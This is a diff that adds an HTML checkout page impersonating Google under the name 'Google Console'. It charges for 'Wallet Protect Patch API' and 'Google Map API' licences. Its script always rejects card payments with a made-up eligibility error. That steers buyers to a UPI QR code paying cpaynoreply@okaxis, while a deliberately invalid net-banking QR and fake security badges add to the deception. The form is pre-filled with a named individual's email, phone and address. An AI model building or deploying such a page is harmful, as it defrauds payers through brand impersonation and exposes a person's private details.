@@ -1,0 +1,1200 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Secure Checkout – Google Console</title>
+  <meta name="description" content="Advanced checkout experience for premium digital products with secure payment processing." />
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #f8f9fa;
+      color: #333;
+      line-height: 1.6;
+      min-height: 100vh;
+    }
+
+    .container {
+      max-width: 1400px;
+      margin: 0 auto;
+      padding: 0 20px;
+    }
+
+    /* Header */
+    .header {
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(20px);
+      border-bottom: 1px solid rgba(0, 0, 0, 0.1);
+      padding: 1rem 0;
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+    }
+
+    .header-content {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      color: #333;
+      text-decoration: none;
+      font-size: 1.8rem;
+      font-weight: 700;
+    }
+
+    .logo i {
+      font-size: 2.2rem;
+      background: linear-gradient(45deg, #4285f4, #34a853, #fbbc04, #ea4335);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    .nav-menu {
+      display: flex;
+      gap: 2rem;
+      align-items: center;
+    }
+
+    .nav-link {
+      color: rgba(0, 0, 0, 0.7);
+      text-decoration: none;
+      font-weight: 500;
+      padding: 0.5rem 1rem;
+      border-radius: 25px;
+      transition: all 0.3s ease;
+    }
+
+    .nav-link:hover, .nav-link.active {
+      color: #4285f4;
+      background: rgba(66, 133, 244, 0.1);
+    }
+
+    /* Advanced Checkout Styles */
+    .checkout-container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 2rem 1rem;
+    }
+
+    .checkout-progress {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 3rem;
+      position: relative;
+    }
+
+    .progress-step {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+      flex: 1;
+      max-width: 200px;
+    }
+
+    .progress-step::before {
+      content: '';
+      position: absolute;
+      top: 20px;
+      left: 50%;
+      width: 100%;
+      height: 2px;
+      background: rgba(255, 255, 255, 0.2);
+      z-index: 1;
+    }
+
+    .progress-step:last-child::before {
+      display: none;
+    }
+
+    .step-circle {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      background: rgba(255, 255, 255, 0.1);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: bold;
+      color: rgba(255, 255, 255, 0.6);
+      position: relative;
+      z-index: 2;
+      transition: all 0.3s ease;
+      border: 2px solid rgba(255, 255, 255, 0.2);
+    }
+
+    .step-circle.active {
+      background: linear-gradient(135deg, #4285f4 0%, #34a853 100%);
+      color: white;
+      box-shadow: 0 4px 15px rgba(66, 133, 244, 0.4);
+      border-color: transparent;
+    }
+
+    .step-circle.completed {
+      background: #34a853;
+      color: white;
+      border-color: transparent;
+    }
+
+    .step-label {
+      margin-top: 0.5rem;
+      font-size: 0.9rem;
+      color: rgba(255, 255, 255, 0.6);
+      text-align: center;
+    }
+
+    .step-label.active {
+      color: #4285f4;
+      font-weight: 600;
+    }
+
+    .checkout-main {
+      display: grid;
+      grid-template-columns: 1fr 400px;
+      gap: 3rem;
+      margin-top: 2rem;
+    }
+
+    .checkout-form {
+      background: rgba(255, 255, 255, 0.9);
+      backdrop-filter: blur(20px);
+      border-radius: 20px;
+      padding: 2rem;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.1);
+      border: 1px solid rgba(0, 0, 0, 0.1);
+    }
+
+    .form-section {
+      margin-bottom: 2.5rem;
+    }
+
+    .section-title {
+      font-size: 1.4rem;
+      font-weight: 700;
+      color: #333;
+      margin-bottom: 1.5rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .section-title i {
+      color: #4285f4;
+    }
+
+    .form-group {
+      margin-bottom: 1.5rem;
+    }
+
+    .form-label {
+      display: block;
+      font-weight: 600;
+      color: rgba(0, 0, 0, 0.8);
+      margin-bottom: 0.5rem;
+      font-size: 0.9rem;
+    }
+
+    .form-input {
+      width: 100%;
+      padding: 0.875rem 1rem;
+      border: 2px solid rgba(0, 0, 0, 0.2);
+      border-radius: 12px;
+      font-size: 1rem;
+      transition: all 0.3s ease;
+      background: rgba(255, 255, 255, 0.9);
+      color: #333;
+    }
+
+    .form-input::placeholder {
+      color: rgba(0, 0, 0, 0.5);
+    }
+
+    .form-input:focus {
+      outline: none;
+      border-color: #4285f4;
+      background: rgba(255, 255, 255, 1);
+      box-shadow: 0 0 0 3px rgba(66, 133, 244, 0.2);
+      transform: translateY(-1px);
+    }
+
+    .form-input.valid {
+      border-color: #34a853;
+      background: rgba(52, 168, 83, 0.1);
+    }
+
+    .form-input.invalid {
+      border-color: #ea4335;
+      background: rgba(234, 67, 53, 0.1);
+    }
+
+    .input-icon {
+      position: relative;
+    }
+
+    .input-icon i {
+      position: absolute;
+      left: 1rem;
+      top: 50%;
+      transform: translateY(-50%);
+      color: rgba(0, 0, 0, 0.5);
+      z-index: 2;
+    }
+
+    .input-icon .form-input {
+      padding-left: 2.5rem;
+    }
+
+    .form-row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1rem;
+    }
+
+    .payment-methods {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+      gap: 1rem;
+      margin-bottom: 1.5rem;
+    }
+
+    .payment-method {
+      border: 2px solid rgba(0, 0, 0, 0.2);
+      border-radius: 12px;
+      padding: 1rem;
+      text-align: center;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      background: rgba(255, 255, 255, 0.9);
+      color: #333;
+    }
+
+    .payment-method:hover {
+      border-color: #4285f4;
+      transform: translateY(-2px);
+      box-shadow: 0 4px 12px rgba(66, 133, 244, 0.3);
+    }
+
+    .payment-method.selected {
+      border-color: #4285f4;
+      background: linear-gradient(135deg, rgba(66, 133, 244, 0.1) 0%, rgba(52, 168, 83, 0.1) 100%);
+      color: #4285f4;
+    }
+
+    .payment-method i {
+      font-size: 1.5rem;
+      color: #4285f4;
+      margin-bottom: 0.5rem;
+    }
+
+    .checkout-btn {
+      width: 100%;
+      padding: 1rem 2rem;
+      background: linear-gradient(135deg, #4285f4 0%, #34a853 100%);
+      color: white;
+      border: none;
+      border-radius: 12px;
+      font-size: 1.1rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      position: relative;
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+    }
+
+    .checkout-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 25px rgba(66, 133, 244, 0.4);
+    }
+
+    .checkout-btn:active {
+      transform: translateY(0);
+    }
+
+    .order-summary {
+      background: rgba(255, 255, 255, 0.9);
+      backdrop-filter: blur(20px);
+      border-radius: 20px;
+      padding: 2rem;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.1);
+      border: 1px solid rgba(0, 0, 0, 0.1);
+      height: fit-content;
+      position: sticky;
+      top: 2rem;
+    }
+
+    .summary-item {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 1rem 0;
+      border-bottom: 1px solid rgba(0, 0, 0, 0.1);
+    }
+
+    .summary-item:last-child {
+      border-bottom: none;
+    }
+
+    .item-details {
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+    }
+
+    .item-icon {
+      width: 40px;
+      height: 40px;
+      background: linear-gradient(135deg, #4285f4 0%, #34a853 100%);
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+    }
+
+    .item-name {
+      font-weight: 600;
+      color: #333;
+    }
+
+    .item-price {
+      font-weight: 700;
+      color: #333;
+    }
+
+    .total-section {
+      margin-top: 1.5rem;
+      padding-top: 1.5rem;
+      border-top: 2px solid rgba(0, 0, 0, 0.2);
+    }
+
+    .total-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 0.5rem;
+    }
+
+    .total-final {
+      font-size: 1.25rem;
+      font-weight: 700;
+      color: #333;
+      padding: 1rem;
+      background: linear-gradient(135deg, rgba(66, 133, 244, 0.1) 0%, rgba(52, 168, 83, 0.1) 100%);
+      border-radius: 12px;
+      margin-top: 1rem;
+      border: 1px solid rgba(66, 133, 244, 0.3);
+    }
+
+    .security-badge {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      color: #34a853;
+      font-size: 0.9rem;
+      margin-top: 1rem;
+      padding: 0.75rem;
+      background: rgba(52, 168, 83, 0.1);
+      border-radius: 8px;
+      border: 1px solid rgba(52, 168, 83, 0.3);
+    }
+
+    .loading-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(255, 255, 255, 0.9);
+      backdrop-filter: blur(10px);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+    }
+
+    .loading-overlay p {
+      color: #333;
+    }
+
+    .error-message {
+      background: rgba(234, 67, 53, 0.1);
+      border: 1px solid rgba(234, 67, 53, 0.3);
+      color: #ea4335;
+      padding: 1rem;
+      border-radius: 8px;
+      margin-top: 1rem;
+      display: none;
+    }
+
+    .upi-container {
+      text-align: center;
+    }
+
+    .qr-code-container {
+      background: rgba(255, 255, 255, 0.95);
+      padding: 2rem;
+      border-radius: 12px;
+      border: 2px solid rgba(255, 255, 255, 0.2);
+      margin-bottom: 1.5rem;
+    }
+
+    .upi-details-info {
+      background: rgba(0, 0, 0, 0.05);
+      padding: 1rem;
+      border-radius: 8px;
+      margin-bottom: 1.5rem;
+      border: 1px solid rgba(0, 0, 0, 0.1);
+    }
+
+    .upi-info-row {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 0.5rem;
+    }
+
+    .upi-info-row:last-child {
+      margin-bottom: 0;
+    }
+
+    .upi-label {
+      font-weight: 600;
+      color: rgba(0, 0, 0, 0.8);
+    }
+
+    .upi-value {
+      font-weight: 700;
+      color: #333;
+    }
+
+    .upi-instructions {
+      text-align: left;
+      background: rgba(0, 0, 0, 0.05);
+      padding: 1.5rem;
+      border-radius: 8px;
+      border: 1px solid rgba(0, 0, 0, 0.1);
+    }
+
+    .upi-instructions h4 {
+      margin-bottom: 1rem;
+      color: #333;
+    }
+
+    .upi-instructions ol {
+      margin: 0;
+      padding-left: 1.5rem;
+    }
+
+    .upi-instructions li {
+      margin-bottom: 0.5rem;
+      color: rgba(0, 0, 0, 0.8);
+    }
+
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 4px solid rgba(255, 255, 255, 0.2);
+      border-top: 4px solid #4285f4;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    @media (max-width: 768px) {
+      .checkout-main {
+        grid-template-columns: 1fr;
+        gap: 2rem;
+      }
+      
+      .form-row {
+        grid-template-columns: 1fr;
+      }
+      
+      .payment-methods {
+        grid-template-columns: repeat(2, 1fr);
+      }
+      
+      .progress-step {
+        max-width: 100px;
+      }
+      
+      .step-label {
+        font-size: 0.8rem;
+      }
+    }
+
+    /* Footer */
+    .footer {
+      background: #f1f3f4;
+      padding: 3rem 0 2rem;
+      border-top: 1px solid rgba(0, 0, 0, 0.1);
+      margin-top: 4rem;
+    }
+
+    .footer-content {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+      gap: 3rem;
+      margin-bottom: 2rem;
+    }
+
+    .footer-section h4 {
+      color: #333;
+      font-size: 1.2rem;
+      font-weight: 600;
+      margin-bottom: 1rem;
+    }
+
+    .footer-section p,
+    .footer-section a {
+      color: rgba(0, 0, 0, 0.7);
+      text-decoration: none;
+      line-height: 1.8;
+      transition: color 0.3s ease;
+    }
+
+    .footer-section a:hover {
+      color: #4285f4;
+    }
+
+    .footer-bottom {
+      text-align: center;
+      padding-top: 2rem;
+      border-top: 1px solid rgba(0, 0, 0, 0.1);
+      color: rgba(0, 0, 0, 0.5);
+    }
+
+    .fade-in {
+      animation: fadeIn 0.6s ease-in;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body>
+  <header class="header">
+    <div class="container">
+      <div class="header-content">
+        <a href="index.html" class="logo">
+          <i class="fab fa-google"></i>
+          <span>Google Console</span>
+        </a>
+        <nav class="nav-menu">
+          <a href="index.html" class="nav-link">Home</a>
+          <a href="products_new.html" class="nav-link">Products</a>
+          <a href="checkout.html" class="nav-link active">Checkout</a>
+        </nav>
+      </div>
+    </div>
+  </header>
+
+  <main class="section">
+    <div class="checkout-container fade-in">
+      <!-- Progress Indicator -->
+      <div class="checkout-progress">
+        <div class="progress-step">
+          <div class="step-circle completed">
+            <i class="fas fa-shopping-cart"></i>
+          </div>
+          <div class="step-label">Cart</div>
+        </div>
+        <div class="progress-step">
+          <div class="step-circle active">
+            <i class="fas fa-credit-card"></i>
+          </div>
+          <div class="step-label active">Checkout</div>
+        </div>
+        <div class="progress-step">
+          <div class="step-circle">
+            <i class="fas fa-check"></i>
+          </div>
+          <div class="step-label">Complete</div>
+        </div>
+      </div>
+
+      <div class="checkout-main">
+        <!-- Checkout Form -->
+        <div class="checkout-form">
+          <form id="checkoutForm" onsubmit="handleCheckout(event)">
+            <!-- Contact Information -->
+            <div class="form-section">
+              <h2 class="section-title">
+                <i class="fas fa-user"></i>
+                Contact Information
+              </h2>
+              <div class="form-group">
+                <label class="form-label">Full Name *</label>
+                <div class="input-icon">
+                  <i class="fas fa-user"></i>
+                  <input type="text" class="form-input" placeholder="Enter your full name" value="Neeraj Sahu" required>
+                </div>
+              </div>
+              <div class="form-row">
+                <div class="form-group">
+                  <label class="form-label">Email Address *</label>
+                  <div class="input-icon">
+                    <i class="fas fa-envelope"></i>
+                    <input type="email" class="form-input" placeholder="your@email.com" value="justvisitepluse@gmail.com" required>
+                  </div>
+                </div>
+                <div class="form-group">
+                  <label class="form-label">Phone Number *</label>
+                  <div class="input-icon">
+                    <i class="fas fa-phone"></i>
+                    <input type="tel" class="form-input" placeholder="Your phone number" value="8299493913" pattern="[0-9]{10}" maxlength="10" required>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <!-- Billing Address -->
+            <div class="form-section">
+              <h2 class="section-title">
+                <i class="fas fa-map-marker-alt"></i>
+                Billing Address
+              </h2>
+              <div class="form-group">
+                <label class="form-label">Street Address *</label>
+                <div class="input-icon">
+                  <i class="fas fa-home"></i>
+                  <input type="text" class="form-input" placeholder="Street address" value="230 Bahar Khanderao Gate" required>
+                </div>
+              </div>
+              <div class="form-row">
+                <div class="form-group">
+                  <label class="form-label">City *</label>
+                  <input type="text" class="form-input" placeholder="City" value="Jhansi" required>
+                </div>
+                <div class="form-group">
+                  <label class="form-label">State *</label>
+                  <input type="text" class="form-input" placeholder="State" value="Uttar Pradesh" required>
+                </div>
+              </div>
+              <div class="form-row">
+                <div class="form-group">
+                  <label class="form-label">PIN Code *</label>
+                  <input type="text" class="form-input" placeholder="PIN Code" pattern="[0-9]{6}" maxlength="6" required>
+                </div>
+                <div class="form-group">
+                  <label class="form-label">Country *</label>
+                  <select class="form-input" required>
+                    <option value="India" selected>India</option>
+                    <option value="USA">United States</option>
+                    <option value="UK">United Kingdom</option>
+                    <option value="Canada">Canada</option>
+                  </select>
+                </div>
+              </div>
+            </div>
+
+            <!-- Payment Method -->
+            <div class="form-section">
+              <h2 class="section-title">
+                <i class="fas fa-credit-card"></i>
+                Payment Method
+              </h2>
+              <div class="payment-methods">
+                <div class="payment-method selected" data-method="card">
+                  <i class="fas fa-credit-card"></i>
+                  <div>Credit Card</div>
+                </div>
+                <div class="payment-method" data-method="upi">
+                  <i class="fab fa-google-pay"></i>
+                  <div>UPI</div>
+                </div>
+                <div class="payment-method" data-method="netbanking">
+                  <i class="fas fa-university"></i>
+                  <div>Net Banking</div>
+                </div>
+                <div class="payment-method" data-method="wallet">
+                  <i class="fas fa-wallet"></i>
+                  <div>Wallet</div>
+                </div>
+              </div>
+
+              <!-- Card Details (shown by default) -->
+              <div id="cardDetails" class="payment-details">
+                <div class="form-group">
+                  <label class="form-label">Card Number *</label>
+                  <div class="input-icon">
+                    <i class="fas fa-credit-card"></i>
+                    <input type="text" class="form-input" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                  </div>
+                </div>
+                <div class="form-row">
+                  <div class="form-group">
+                    <label class="form-label">Expiry Date *</label>
+                    <input type="text" class="form-input" placeholder="MM/YY" maxlength="5" required>
+                  </div>
+                  <div class="form-group">
+                    <label class="form-label">CVV *</label>
+                    <input type="text" class="form-input" placeholder="123" maxlength="4" required>
+                  </div>
+                </div>
+                <div class="form-group">
+                  <label class="form-label">Cardholder Name *</label>
+                  <input type="text" class="form-input" placeholder="Name on card" required>
+                </div>
+              </div>
+
+              <!-- UPI Details (hidden by default) -->
+              <div id="upiDetails" class="payment-details" style="display: none;">
+                <div class="upi-container">
+                  <div class="qr-section">
+                    <h3 style="text-align: center; margin-bottom: 1rem; color: #2d3748;">Scan QR Code to Pay</h3>
+                    <div class="qr-code-container">
+                      <div id="qrcode" style="display: flex; justify-content: center; margin-bottom: 1rem;"></div>
+                    </div>
+                    <div class="upi-details-info">
+                      <div class="upi-info-row">
+                        <span class="upi-label">UPI ID:</span>
+                        <span class="upi-value">cpaynoreply@okaxis</span>
+                      </div>
+                      <div class="upi-info-row">
+                        <span class="upi-label">Amount:</span>
+                        <span class="upi-value">₹44,195</span>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="upi-instructions">
+                    <h4>How to Pay:</h4>
+                    <ol>
+                      <li>Open any UPI app (Google Pay, PhonePe, Paytm, etc.)</li>
+                      <li>Scan the QR code above</li>
+                      <li>Verify the amount and UPI ID</li>
+                      <li>Complete the payment</li>
+                    </ol>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Net Banking Details (hidden by default) -->
+              <div id="netbankingDetails" class="payment-details" style="display: none;">
+                <div class="upi-container">
+                  <div class="qr-section">
+                    <h3 style="text-align: center; margin-bottom: 1rem; color: #2d3748;">Net Banking QR Code</h3>
+                    <div class="qr-code-container">
+                      <div id="netbankingQrcode" style="display: flex; justify-content: center; margin-bottom: 1rem;"></div>
+                    </div>
+                    <div class="upi-details-info">
+                      <div class="upi-info-row">
+                        <span class="upi-label">Bank:</span>
+                        <span class="upi-value">All Banks Supported</span>
+                      </div>
+                      <div class="upi-info-row">
+                        <span class="upi-label">Amount:</span>
+                        <span class="upi-value">₹44,195</span>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="upi-instructions">
+                    <h4>Net Banking Steps:</h4>
+                    <ol>
+                      <li>Scan the QR code with your banking app</li>
+                      <li>Login to your net banking</li>
+                      <li>Verify the payment details</li>
+                      <li>Complete the transaction</li>
+                    </ol>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <button type="submit" class="checkout-btn">
+              <i class="fas fa-lock"></i>
+              Complete Secure Payment - ₹45,766.30
+            </button>
+
+            <div class="security-badge">
+              <i class="fas fa-shield-alt"></i>
+              Your payment information is encrypted and secure
+            </div>
+          </form>
+        </div>
+
+        <!-- Order Summary -->
+        <div class="order-summary">
+          <h2 class="section-title">
+            <i class="fas fa-receipt"></i>
+            Order Summary
+          </h2>
+          
+          <div class="summary-item">
+            <div class="item-details">
+              <div class="item-icon">
+                <i class="fas fa-shield-alt"></i>
+              </div>
+              <div>
+                <div class="item-name">Wallet Protect Patch API</div>
+                <div style="font-size: 0.9rem; color: #999;">Digital License</div>
+              </div>
+            </div>
+            <div class="item-price">₹6,894.00</div>
+          </div>
+
+          <div class="summary-item">
+            <div class="item-details">
+              <div class="item-icon">
+                <i class="fas fa-map"></i>
+              </div>
+              <div>
+                <div class="item-name">Google Map API</div>
+                <div style="font-size: 0.9rem; color: #999;">Premium Access</div>
+              </div>
+            </div>
+            <div class="item-price">₹31,891.00</div>
+          </div>
+
+          <div class="total-section">
+            <div class="total-row">
+              <span>Wallet Protect Patch API</span>
+              <span>₹6,894.00</span>
+            </div>
+            <div class="total-row">
+              <span>Google Map API</span>
+              <span>₹31,891.00</span>
+            </div>
+            <div class="total-row">
+              <span>Subtotal</span>
+              <span>₹38,785.00</span>
+            </div>
+            <div class="total-row">
+              <span>GST (18%)</span>
+              <span>₹6,981.30</span>
+            </div>
+            <div class="total-row">
+              <span>Total Amount</span>
+              <span>₹45,766.30</span>
+            </div>
+            
+            <div class="total-final">
+              <div class="total-row">
+                <span>Net Payable Amount</span>
+                <span>₹45,766.30</span>
+              </div>
+            </div>
+          </div>
+
+          <div class="security-badge">
+            <i class="fas fa-lock"></i>
+            SSL Encrypted & PCI Compliant
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <!-- Loading Overlay -->
+  <div class="loading-overlay" id="loadingOverlay">
+    <div style="text-align: center;">
+      <div class="spinner"></div>
+      <p style="margin-top: 1rem; font-weight: 600;">Processing your payment...</p>
+    </div>
+  </div>
+
+  <footer class="footer">
+    <div class="container">
+      <div class="footer-content">
+        <div class="footer-section">
+          <h4>Google Console</h4>
+          <p>Secure digital marketplace for premium products.</p>
+        </div>
+        <div class="footer-section">
+          <h4>Products</h4>
+          <a href="products.html">Analytics Tools</a><br>
+          <a href="products.html">SEO Suite</a><br>
+          <a href="products.html">Security Tools</a>
+        </div>
+        <div class="footer-section">
+          <h4>Support</h4>
+          <a href="#help">Help Center</a><br>
+          <a href="#docs">Documentation</a><br>
+          <a href="#contact">Contact Us</a>
+        </div>
+        <div class="footer-section">
+          <h4>Legal</h4>
+          <a href="#privacy">Privacy Policy</a><br>
+          <a href="#terms">Terms of Service</a><br>
+          <a href="#security">Security</a>
+        </div>
+      </div>
+      <div class="footer-bottom">
+        <p>&copy; <span id="year"></span> Google Console. All rights reserved.</p>
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    document.getElementById('year').textContent = new Date().getFullYear();
+
+    // Payment method selection
+    document.querySelectorAll('.payment-method').forEach(method => {
+      method.addEventListener('click', function() {
+        document.querySelectorAll('.payment-method').forEach(m => m.classList.remove('selected'));
+        this.classList.add('selected');
+        
+        // Hide all payment details
+        document.querySelectorAll('.payment-details').forEach(detail => {
+          detail.style.display = 'none';
+        });
+        
+        // Hide any existing error messages
+        const errorDiv = document.getElementById('cardError');
+        if (errorDiv) {
+          errorDiv.style.display = 'none';
+        }
+        
+        // Show selected payment details
+        const selectedMethod = this.dataset.method;
+        const detailsElement = document.getElementById(selectedMethod + 'Details');
+        if (detailsElement) {
+          detailsElement.style.display = 'block';
+          
+          // Generate QR code for UPI
+          if (selectedMethod === 'upi') {
+            setTimeout(() => {
+              generateUPIQR();
+            }, 100);
+          }
+          
+          // Generate invalid QR code for Net Banking
+          if (selectedMethod === 'netbanking') {
+            setTimeout(() => {
+              generateInvalidQR();
+            }, 100);
+          }
+        }
+      });
+    });
+
+    // Form validation
+    document.querySelectorAll('.form-input').forEach(input => {
+      input.addEventListener('blur', function() {
+        if (this.checkValidity()) {
+          this.classList.add('valid');
+          this.classList.remove('invalid');
+        } else {
+          this.classList.add('invalid');
+          this.classList.remove('valid');
+        }
+      });
+    });
+
+    // Card number formatting
+    document.querySelector('input[placeholder="1234 5678 9012 3456"]').addEventListener('input', function(e) {
+      let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
+      let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
+      if (formattedValue !== e.target.value) {
+        e.target.value = formattedValue;
+      }
+    });
+
+    // Expiry date formatting
+    document.querySelector('input[placeholder="MM/YY"]').addEventListener('input', function(e) {
+      let value = e.target.value.replace(/\D/g, '');
+      if (value.length >= 2) {
+        value = value.substring(0, 2) + '/' + value.substring(2, 4);
+      }
+      e.target.value = value;
+    });
+
+    // Handle form submission
+    function handleCheckout(event) {
+      event.preventDefault();
+      
+      const selectedMethod = document.querySelector('.payment-method.selected').dataset.method;
+      
+      if (selectedMethod === 'card') {
+        // Show card error message
+        showCardError();
+        return;
+      }
+      
+      // Show loading overlay
+      document.getElementById('loadingOverlay').style.display = 'flex';
+      
+      // Simulate payment processing
+      setTimeout(() => {
+        window.location.href = 'success.html';
+      }, 3000);
+    }
+
+    // Show card error message
+    function showCardError() {
+      const errorDiv = document.getElementById('cardError');
+      if (!errorDiv) {
+        const newErrorDiv = document.createElement('div');
+        newErrorDiv.id = 'cardError';
+        newErrorDiv.className = 'error-message';
+        newErrorDiv.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Your Card Is not Eligible for international transaction, Update Your card And Try Again After 1 Week';
+        
+        const cardDetails = document.getElementById('cardDetails');
+        cardDetails.appendChild(newErrorDiv);
+      }
+      
+      document.getElementById('cardError').style.display = 'block';
+      
+      // Hide error after 5 seconds
+      setTimeout(() => {
+        document.getElementById('cardError').style.display = 'none';
+      }, 5000);
+    }
+
+    // Generate UPI QR Code
+    function generateUPIQR() {
+      // Simple UPI string without pn parameter to avoid name override
+      const upiString = `upi://pay?pa=cpaynoreply@okaxis&am=44195&cu=INR&tn=Cpay`;
+      
+      // Clear previous QR code
+      const qrContainer = document.getElementById('qrcode');
+      qrContainer.innerHTML = '';
+      
+      // Create canvas element
+      const canvas = document.createElement('canvas');
+      qrContainer.appendChild(canvas);
+      
+      // Generate QR code
+      try {
+        QRCode.toCanvas(canvas, upiString, {
+          width: 200,
+          height: 200,
+          margin: 2,
+          color: {
+            dark: '#000000',
+            light: '#ffffff'
+          },
+          errorCorrectionLevel: 'M'
+        }, function (error) {
+          if (error) {
+            console.error('QR Code generation error:', error);
+            // Fallback to text-based QR if canvas fails
+            generateFallbackQR();
+          } else {
+            console.log('QR Code generated successfully');
+          }
+        });
+      } catch (error) {
+        console.error('QR Code library error:', error);
+        generateFallbackQR();
+      }
+    }
+
+    // Fallback QR generation using Google Charts API
+    function generateFallbackQR() {
+      const upiString = `upi://pay?pa=cpaynoreply@okaxis&am=44195&cu=INR&tn=Cpay`;
+      const qrContainer = document.getElementById('qrcode');
+      qrContainer.innerHTML = '';
+      
+      const img = document.createElement('img');
+      img.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(upiString)}`;
+      img.alt = 'UPI Payment QR Code';
+      img.style.maxWidth = '200px';
+      img.style.height = 'auto';
+      img.style.border = '1px solid #ddd';
+      
+      qrContainer.appendChild(img);
+    }
+
+    // Generate Invalid QR Code for Net Banking
+    function generateInvalidQR() {
+      const invalidString = `invalid://netbanking?bank=error&code=invalid&status=failed&message=QR_NOT_SUPPORTED`;
+      const qrContainer = document.getElementById('netbankingQrcode');
+      qrContainer.innerHTML = '';
+      
+      // Create canvas element
+      const canvas = document.createElement('canvas');
+      qrContainer.appendChild(canvas);
+      
+      // Generate invalid QR code
+      try {
+        QRCode.toCanvas(canvas, invalidString, {
+          width: 200,
+          height: 200,
+          margin: 2,
+          color: {
+            dark: '#000000',
+            light: '#ffffff'
+          },
+          errorCorrectionLevel: 'L'
+        }, function (error) {
+          if (error) {
+            console.error('Invalid QR Code generation error:', error);
+            // Fallback to image-based invalid QR
+            generateInvalidQRFallback();
+          } else {
+            console.log('Invalid QR Code generated');
+          }
+        });
+      } catch (error) {
+        console.error('Invalid QR Code library error:', error);
+        generateInvalidQRFallback();
+      }
+    }
+
+    // Fallback invalid QR generation
+    function generateInvalidQRFallback() {
+      const invalidString = `invalid://netbanking?bank=error&code=invalid&status=failed&message=QR_NOT_SUPPORTED`;
+      const qrContainer = document.getElementById('netbankingQrcode');
+      qrContainer.innerHTML = '';
+      
+      const img = document.createElement('img');
+      img.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(invalidString)}`;
+      img.alt = 'Invalid Net Banking QR Code';
+      img.style.maxWidth = '200px';
+      img.style.height = 'auto';
+      img.style.border = '1px solid #ddd';
+      
+      qrContainer.appendChild(img);
+    }
+
+    // Add smooth animations on scroll
+    const observerOptions = {
+      threshold: 0.1,
+      rootMargin: '0px 0px -50px 0px'
+    };
+
+    const observer = new IntersectionObserver((entries) => {
+      entries.forEach(entry => {
+        if (entry.isIntersecting) {
+          entry.target.style.opacity = '1';
+          entry.target.style.transform = 'translateY(0)';
+        }
+      });
+    }, observerOptions);
+
+    document.querySelectorAll('.form-section').forEach(section => {
+      section.style.opacity = '0';
+      section.style.transform = 'translateY(20px)';
+      section.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
+      observer.observe(section);
+    });
+  </script>
+</body>
+</html>
+
+
